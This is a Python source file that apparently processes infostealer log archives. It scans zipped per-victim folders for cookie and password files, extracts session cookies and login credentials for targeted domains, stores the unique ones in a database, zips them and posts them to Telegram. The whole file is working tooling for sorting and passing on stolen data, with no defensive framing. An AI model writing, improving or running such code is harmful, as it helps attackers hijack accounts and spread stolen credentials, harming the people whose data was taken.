import os
import zipfile
import Logger
import traceback
import time
import sys

class DataAnalysis:
    def __init__(self, logger, telegram_poster, file_manager, database_manager, cookie_search_config, password_search_config):
        self.logger = logger
        self.telegram_poster = telegram_poster
        self.file_manager = file_manager
        self.database_manager = database_manager

        self.cookie_search_config = cookie_search_config
        self.password_search_config = password_search_config

        self.scan_start_time = 0
    
    def scan_for_cookies(self, text_file, cookies_stats, formated_zip_file_name):
        stats = cookies_stats

        for entry_name, entry_data in self.cookie_search_config.items():
            write = False
            
            # write_patterns = {}                          TODO: Multiple pattersper cookie search
            # for pattern in entry_data["pattern"]:
            #     write_patterns[pattern] = False
            
            text_file.seek(0)
            cookie_results = []

            if entry_data["amount"] == "all":
                for line in text_file:

                    fields = line.decode('utf-8').strip().split('\t')
                    if len(fields) != 7:
                        continue  # Skip lines with incorrect format
                    domain = fields[0]

                    if entry_data["domain"] in domain:
                        cookie_results.append(line)
                        stats[entry_name]["found"] += 1

            elif entry_data["amount"] == "multi":
                temp_cookie_results = []
                for line in text_file:

                    fields = line.decode('utf-8').strip().split('\t')
                    if len(fields) != 7:
                        continue  # Skip lines with incorrect format
                    domain = fields[0]
                    cookie_name = fields[5]

                    if entry_data["domain"] in domain:
                        temp_cookie_results.append(line)
                        if entry_data["pattern"] in cookie_name: 
                            stats[entry_name]["found"] += 1
                            if self.database_manager.cookie_exists(entry_name, line):
                                cookie_results = []
                                break
                            self.database_manager.add_cookie_to_database(entry_name, line)
                            stats[entry_name]["unique"] += 1
                            write = True
                if write:
                    cookie_results = temp_cookie_results

            elif entry_data["amount"] == "single":
                for line in text_file:

                    fields = line.decode('utf-8').strip().split('\t')
                    if len(fields) != 7:
                        continue  # Skip lines with incorrect format
                    domain = fields[0]
                    cookie_name = fields[5]

                    if entry_data["domain"] in domain and entry_data["pattern"] in cookie_name:
                        stats[entry_name]["found"] += 1
                        if self.database_manager.cookie_exists(entry_name, line):
                            break
                        self.database_manager.add_cookie_to_database(entry_name, line)
                        stats[entry_name]["unique"] += 1
                        cookie_results.append(line)
                        break
            
            self.file_manager.save_cookies(formated_zip_file_name, cookie_results, entry_name)
        
        return stats
    
    def scan_for_passwords(self, text_file, passwords_stats, formated_zip_file_name):
        stats = passwords_stats

        for entry_name, entry_data in self.password_search_config.items():
            password_results = []
            text_file.seek(0)

            for line in text_file:
                decoded_line = line.decode("utf-8")
                
                if entry_data in decoded_line and ("URL:" in decoded_line or "url:" in decoded_line):
                    try :
                        username = next(text_file).split()[1]
                        password = next(text_file).split()[1]
                        #TODO sometimes list index out of bound but idk why
                        stats[entry_name]["found"] += 1
                        if self.database_manager.credential_exists(entry_name, username, password):
                            continue

                        self.database_manager.add_credential_to_database(entry_name, username, password)
                        stats[entry_name]["unique"] += 1
                        password_results.append((username, password))
                    except :
                        traceback.print_exc() 
                        self.logger.print_error(f"Error while extrating password/username.")
                        pass
            
            self.file_manager.save_passwords(formated_zip_file_name, password_results, entry_name)
        
        return stats

    def progress(self, current, total):
        elapsed_time = time.time() - self.scan_start_time

        if elapsed_time != 0:
            scan_speed_filepersec = current / elapsed_time
        else:
            scan_speed_filepersec = 0

        progress_percentage = current / total
        progress_bar_length = 30  # Adjust the length of the progress bar as needed
        completed_length = int(progress_percentage * progress_bar_length)

        progress_bar = "|" + "█" * completed_length + " " * (progress_bar_length - completed_length) + "|"
        
        sys.stdout.write(f"\r           {progress_bar} {progress_percentage * 100:.2f}% [{current}/{total}] @ {int(scan_speed_filepersec)} files/s")
        sys.stdout.flush()

    def scan_zip_log(self, zip_file_path, zip_file_name):
        cookies_stats = {}
        for cookie_type, _ in self.cookie_search_config.items():
            cookies_stats[cookie_type] = {
                "found": 0,
                "unique": 0
            }
        
        passwords_stats = {}
        for cookie_type, _ in self.password_search_config.items():
            passwords_stats[cookie_type] = {
                "found": 0,
                "unique": 0
            }

        skipped_files = 0
        self.scan_start_time = time.time()

        with zipfile.ZipFile(zip_file_path, 'r') as zip_archive:
            total_files_amount = len(zip_archive.infolist())
            for index, file_info in enumerate(zip_archive.infolist()):
                file_name = file_info.filename

                # skip scanning the files inside the filegrabber folder 
                if "filegrabber" in file_name.lower() or "file grabber" in file_name.lower():
                    skipped_files += 1
                    self.progress(index + 1, total_files_amount)
                    continue
                
                formated_zip_file_name = f"{zip_file_name}_{file_name.replace('/', '_')}"

                try:
                    if "Cookies" in file_name and file_name.endswith(".txt"):
                        with zip_archive.open(file_name, 'r') as f:
                            cookies_stats = self.scan_for_cookies(f, cookies_stats, formated_zip_file_name)

                    if "Passwords" in file_name and file_name.endswith(".txt"):
                        with zip_archive.open(file_name, 'r') as f:
                            passwords_stats = self.scan_for_passwords(f, passwords_stats, formated_zip_file_name) 
                except:
                    self.logger.print_error(f"Could not open: \n{file_name}")
                    traceback.print_exc()
                    #return None, None

                self.progress(index + 1, total_files_amount)
        
        if skipped_files > 0:
            print("")
            self.logger.print_warning(f"{skipped_files} files inside FileGrabber folders where skipped!")

        return cookies_stats, passwords_stats
    
    def count_users_zip(self, zip_file_path):
        user_folders = set()

        with zipfile.ZipFile(zip_file_path, "r") as zip_archive:
            for file_info in zip_archive.infolist():
                if '/' in file_info.filename:
                    # Extract the folder name from the file path
                    folder_name = file_info.filename.split('/')[0]
                    user_folders.add(folder_name)

        return len(user_folders)

    def start_scanning(self, zip_file_path : str, zip_file_name : str, auto_delete : bool):
        self.database_manager.open()
        self.logger.print_info(f"", False, False)
        self.logger.print_info(f"{Logger.CYAN}{zip_file_name}{Logger.ENDC}:", True)
        self.logger.print_info(f"--------------------------------------------------------------------", True, False)
        try:
            user_count = self.count_users_zip(zip_file_path)
            self.logger.print_info(f"Scanning {user_count} users...", False, False)

            cookies_stats, passwords_stats = self.scan_zip_log(zip_file_path, zip_file_name) 
        except Exception as e:
            traceback.print_exc()
            self.logger.print_error(f"\n > A fatal ERROR occured... Skipping File!")
            cookies_stats, passwords_stats = None, None
        
        print("")
        self.logger.print_info(f"--------------------------------------------------------------------\n", True, False)
        left_padding = " " * 5

        total_found = 0
        if cookies_stats is not None and passwords_stats is not None:
            if cookies_stats:
                title_text = f"--------------------->>> COOKIES <<<---------------------"
                self.logger.print_info(f"{Logger.CYAN}{title_text: ^68}{Logger.ENDC}", True, False)

                for cookie_type, data in cookies_stats.items():
                    found_cookies = data["found"]
                    unique_cookies = data["unique"]
                    self.logger.print_info(f"{left_padding}For {cookie_type}:", True, False)
                    self.logger.print_info(f"{left_padding} > Found cookies: {found_cookies}", False, False)
                    if unique_cookies > 0:
                        self.logger.print_success(f"{left_padding} > Unique cookies: {unique_cookies}", False, False)
                    else:
                        self.logger.print_info(f"{left_padding} > Unique cookies: {unique_cookies}", False, False)
                    print("")
                    total_found += unique_cookies
            
            if passwords_stats:
                title_text = f"------------------->>> CREDENTIALS <<<-------------------"
                self.logger.print_info(f"{Logger.CYAN}{title_text: ^68}{Logger.ENDC}", True, False)
                
                for password_type, data in passwords_stats.items():
                    found_credentials = data["found"]
                    unique_credentials = data["unique"]
                    self.logger.print_info(f"{left_padding}For {password_type}:", True, False)
                    self.logger.print_info(f"{left_padding} > Found credentials: {found_credentials}", False, False)
                    if unique_credentials > 0:
                        self.logger.print_success(f"{left_padding} > Unique credentials: {unique_credentials}", False, False)
                    else:
                        self.logger.print_info(f"{left_padding} > Unique credentials: {unique_credentials}", False, False)
                    print("")
                    total_found += unique_credentials
        
            self.logger.print_info(f"--------------------------------------------------------------------\n", True, False)
        
        self.database_manager.close()
        if auto_delete:
            os.remove(zip_file_path)
        
        # create one large password txt zip file
        # create one large password txt zip file
        # create one large password txt zip file


        # root_folder = r'C:\path\to\your\root_folder'
        # output_file = r'C:\path\to\output_file.txt'

        # with open(output_file, 'w') as output:
        #     for foldername, subfolders, filenames in os.walk(root_folder):
        #         for filename in filenames:
        #             file_path = os.path.join(foldername, filename)
        #             with open(file_path, 'r') as file:
        #                 output.write(file.read() + '\n')

        if total_found > 0:
            self.logger.print_info(f"Creating ZIP Archive...")
            path_to_output_zip = self.file_manager.compress_into_zip()
            self.telegram_poster.post_log(path_to_output_zip, zip_file_name, cookies_stats, passwords_stats)
        else:
            self.logger.print_warning(f"Nothing got posted because no search results were found!")

        print("")
        self.logger.print_info(f"Cleaning output folders...")
        self.file_manager.clear_output_subfolders()
        self.logger.print_success(f"Done!\n\n\n", True)
